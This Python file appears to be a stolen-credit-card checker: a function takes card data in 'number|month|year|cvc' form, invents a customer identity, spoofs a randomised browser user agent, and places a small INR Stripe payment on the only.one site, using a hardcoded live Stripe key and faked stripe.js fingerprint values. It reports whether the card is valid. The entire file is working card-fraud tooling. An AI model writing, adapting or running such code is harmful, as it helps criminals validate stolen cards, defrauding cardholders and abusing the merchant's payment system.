import requests
import random
import json

def check_onlyone(cc, identity): # OK

	try:

		gate_url = 'https://api.only.one/api/v1/stripe/payment_intent'
		gate2_url = 'https://api.stripe.com/v1/payment_intents/{}/confirm'
		gate_user_agent = "Mozilla/5.0 (Windows NT {}.0; Win64; x64) AppleWebKit/{}.{} (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/{}.{}".format(random.randint(11, 99),
			random.randint(111, 999),
			random.randint(11, 99),
			random.randint(11, 99),
			random.randint(1111, 9999),
			random.randint(111, 999),
			random.randint(111, 999),
			random.randint(11, 99))
		gate_check_amount = "200" # INR

		splitted_card = cc.split("|")

		payment_header = {
			'Host': 'api.only.one',
		    'Content-type': 'application/json',
		    'Origin': 'https://only.one',
		    'Sec-fetch-site': 'same-site',
		    'Sec-fetch-mode': 'cors',
		    'Sec-fetch-dest': 'empty',
		    'Referer': 'https://only.one/',
		    'Accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
		    'User-agent': gate_user_agent
		}

		payment_data = "{{'customer':{{'first_name':'{}','last_name':'{}','email':'{}'}},'value':{},'currency':'INR','metadata':{{}}}}".format(identity['results'][0]['name']['first'],
			identity["results"][0]["name"]["last"],
			identity["results"][0]["email"],
			gate_check_amount)

		payment_request = requests.post(gate_url, 
			headers=payment_header, 
			data=payment_data)

		if payment_request.status_code < 300 and '"payment_intent"' in payment_request.text:

			id1 = payment_request.json()['data']['attributes']['client_secret']
			id2 = payment_request.json()['data']['id']

			payment_header = {
				'Accept': 'application/json',
			    'Accept-language': 'es-ES,es;q=0.9',
			    'Content-type': 'application/x-www-form-urlencoded',
			    'Origin': 'https://js.stripe.com',
			    'Referer': 'https://js.stripe.com/',
			    'Sec-fetch-dest': 'empty',
			    'Sec-fetch-mode': 'cors',
			    'Sec-fetch-site': 'same-site',
			    'User-agent': gate_user_agent
			}
			
			payment_data = 'payment_method_data[type]=card&payment_method_data[billing_details][name]={}+{}&payment_method_data[billing_details][email]={}&payment_method_data[billing_details][address][line1]={}&payment_method_data[billing_details][address][city]={}&payment_method_data[billing_details][address][country]={}&payment_method_data[billing_details][address][postal_code]={}&payment_method_data[card][number]={}&payment_method_data[card][cvc]={}&payment_method_data[card][exp_month]={}&payment_method_data[card][exp_year]={}&payment_method_data[guid]=fa60e86c-4e97-4227-97e1-12ce550ac8b422e117&payment_method_data[muid]=d22d9979-b44d-421b-b60f-85d3f90fb3ae40ec39&payment_method_data[sid]=cab480d3-b48d-4c04-bbeb-cd160e4a8eb96eea27&payment_method_data[payment_user_agent]=stripe.js%2F2c04e5ffb%3B+stripe-js-v3%2F2c04e5ffb&payment_method_data[time_on_page]=64971&payment_method_data[referrer]=https%3A%2F%2Fonly.one%2F&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=true&spc_eligible=false&key=pk_live_WGPbgfMspKkssN3TCXlbtQbF&client_secret={}'.format(identity["results"][0]["name"]["first"],
				identity["results"][0]["name"]["last"],
				identity["results"][0]["email"],
				identity["results"][0]["location"]["street"].replace(" ", "+"),
				identity["results"][0]["location"]["city"].replace(" ", "+"),
				identity["results"][0]["nat"],
				identity["results"][0]["location"]["postcode"],
				splitted_card[0],
				splitted_card[3],
				splitted_card[1],
				splitted_card[2],
				id1)

			payment_request = requests.post(gate2_url.format(id2), headers=payment_header, data=payment_data)

			if payment_request.status_code < 300:

				return True

			else: return False

		else: return False

	except Exception as E: raise E